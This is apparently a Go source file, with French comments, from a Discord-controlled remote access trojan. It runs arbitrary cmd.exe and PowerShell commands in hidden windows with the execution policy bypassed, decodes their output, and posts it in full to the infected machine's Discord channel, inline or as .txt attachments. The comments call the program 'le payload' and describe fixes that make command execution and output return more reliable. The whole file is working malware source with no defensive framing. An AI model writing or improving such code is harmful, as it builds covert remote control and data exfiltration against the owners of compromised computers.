// c2out.go — exécution de commandes et restitution complète de la sortie.
//
// Deux défauts corrigés ici par rapport à l'ancien `runHidden` :
//
//  1. le découpage à 1 800 caractères cachait la fin des sorties (`ls` sur un
//     gros dossier s'arrêtait à la première page) : désormais la sortie est
//     intégrale, et au-delà de la limite Discord elle part en pièce jointe
//     `.txt` au lieu d'être tronquée ;
//  2. la console Windows écrit en page de code OEM (850/437 selon la
//     machine), pas en UTF-8 : les accents revenaient en « R�pertoire ».
//     Les commandes sont lancées en UTF-8 (`chcp 65001`) et un repli OEM
//     couvre les programmes qui écrivent malgré tout dans l'ancienne page.
package main

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unicode/utf8"
	"unsafe"
)

const (
	cmdTimeoutLong = 120 * time.Second
	inlineLimit    = 1800 // au-delà : pièce jointe
)

var procMultiByteToWideChar = kernel32DLL.NewProc("MultiByteToWideChar")

// hiddenAttr est l'attribut de création commun à tous les processus lancés par
// le payload : aucune fenêtre, aucune console, aucun flash dans la barre des
// tâches.
func hiddenAttr() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}

// atoi convertit un argument texte en entier (0 en cas d'échec).
func atoi(s string) (int, error) {
	var n int
	_, err := fmt.Sscanf(strings.TrimSpace(s), "%d", &n)
	return n, err
}

// decodeConsole convertit la sortie d'un programme Windows en UTF-8.
// L'UTF-8 valide passe tel quel ; sinon on tente la page OEM de la console
// (CP_OEMCP = 1, résolue par Windows sur la page réellement installée), puis
// Windows-1252.
func decodeConsole(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	if utf8.Valid(b) {
		return string(b)
	}
	if s := toUTF8(b, 1); s != "" { // CP_OEMCP
		return s
	}
	if s := toUTF8(b, 1252); s != "" {
		return s
	}
	return strings.ToValidUTF8(string(b), "?")
}

// toUTF8 passe par MultiByteToWideChar puis UTF-16 → UTF-8 : aucune table de
// conversion à maintenir, la page est celle du système.
func toUTF8(b []byte, codepage uint32) string {
	if len(b) == 0 {
		return ""
	}
	const mbErrInvalidChars = 0x00000008
	n, _, _ := procMultiByteToWideChar.Call(uintptr(codepage), 0,
		uintptr(unsafe.Pointer(&b[0])), uintptr(len(b)), 0, 0)
	if n == 0 {
		return ""
	}
	buf := make([]uint16, n)
	r, _, _ := procMultiByteToWideChar.Call(uintptr(codepage), 0,
		uintptr(unsafe.Pointer(&b[0])), uintptr(len(b)),
		uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if r == 0 {
		return ""
	}
	_ = mbErrInvalidChars
	return syscall.UTF16ToString(buf[:r])
}

// runCmdUTF8 exécute une commande cmd.exe : sortie complète, sans troncature,
// en UTF-8. Le `chcp 65001` s'applique à la console enfant, donc à ce que
// programmes et scripts écrivent.
//
// L'espace final n'est pas décoratif : cmd.exe referme la ligne par un
// guillemet, et un argument qui finit par « \ » (dir E:\) échapperait ce
// guillemet (« dir E:\" ») — d'où « syntaxe du nom de fichier incorrecte ».
func runCmdUTF8(command string) (string, error) {
	full := "chcp 65001>nul & " + command + " "
	return runRaw(cmdTimeoutLong, "cmd.exe", "/d", "/c", full)
}

// runPSUTF8 exécute une commande PowerShell avec la sortie forcée en UTF-8.
func runPSUTF8(command string) (string, error) {
	prelude := "$ProgressPreference='SilentlyContinue';" +
		"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;" +
		"$OutputEncoding=[System.Text.Encoding]::UTF8;"
	return runRaw(cmdTimeoutLong, "powershell.exe", "-NoLogo", "-NoProfile",
		"-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", prelude+command)
}

// runRaw lance un processus masqué et rend stdout+stderr décodés, en entier.
func runRaw(timeout time.Duration, name string, args ...string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	c := exec.CommandContext(ctx, name, args...)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf

	err := c.Run()
	out := decodeConsole(buf.Bytes())
	out = strings.ReplaceAll(out, "\r\n", "\n")
	if ctx.Err() == context.DeadlineExceeded {
		out += fmt.Sprintf("\n[timeout après %s — processus tué]", timeout)
	}
	if err != nil && out == "" {
		err = fmt.Errorf("%s", err.Error())
	}
	return strings.TrimRight(out, "\n"), err
}

// deliverOutput publie une sortie de commande dans le salon de la machine.
// Courte : bloc de code. Longue : fichier `.txt` complet + résumé, jamais de
// troncature silencieuse.
func deliverOutput(title, out string) {
	if strings.TrimSpace(out) == "" {
		discordReply("**" + title + "** — aucune sortie.")
		return
	}
	lines := strings.Count(out, "\n") + 1
	if len(out) <= inlineLimit {
		discordReply("**" + title + "**\n" + codeBlock(out))
		return
	}
	name := fmt.Sprintf("%s-%s.txt", sanitizeFile(title), time.Now().Format("150405"))
	ch := targetChannel()
	if ch == "" {
		discordReply(codeBlock(truncate(out, inlineLimit)) + "\n*(salon indisponible, sortie tronquée)*")
		return
	}
	sendFilesTo(ch, fileOut{Name: name, Data: []byte(out)})
	discordReply(fmt.Sprintf("**%s** — %d lignes, %d caractères → pièce jointe `%s`.\n%s",
		title, lines, len(out), name, codeBlock(tailLines(out, 12))))
}

// codeBlock emballe un texte dans un bloc de code Discord, en neutralisant les
// triples backticks que la sortie pourrait contenir (sinon le bloc se ferme
// au milieu et le message devient illisible).
func codeBlock(s string) string {
	s = strings.ReplaceAll(s, "```", "`\u200b``")
	return "```\n" + s + "\n```"
}

// tailLines garde les n dernières lignes d'un texte.
func tailLines(s string, n int) string {
	lines := strings.Split(s, "\n")
	if len(lines) <= n {
		return s
	}
	return strings.Join(lines[len(lines)-n:], "\n")
}

// sanitizeFile réduit un titre à un nom de fichier sûr.
func sanitizeFile(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			b.WriteRune(r + 32)
		case r == ' ':
			b.WriteRune('-')
		}
	}
	if b.Len() == 0 {
		return "sortie"
	}
	if b.Len() > 40 {
		return b.String()[:40]
	}
	return b.String()
}

// writeTempOutput écrit une sortie dans le dossier de travail et rend le
// chemin (utilisé pour les commandes qui produisent de gros journaux).
func writeTempOutput(name, content string) (string, error) {
	p := workPath(name)
	if err := os.WriteFile(p, []byte(content), 0600); err != nil {
		return "", errors.New("écriture impossible : " + err.Error())
	}
	return p, nil
}
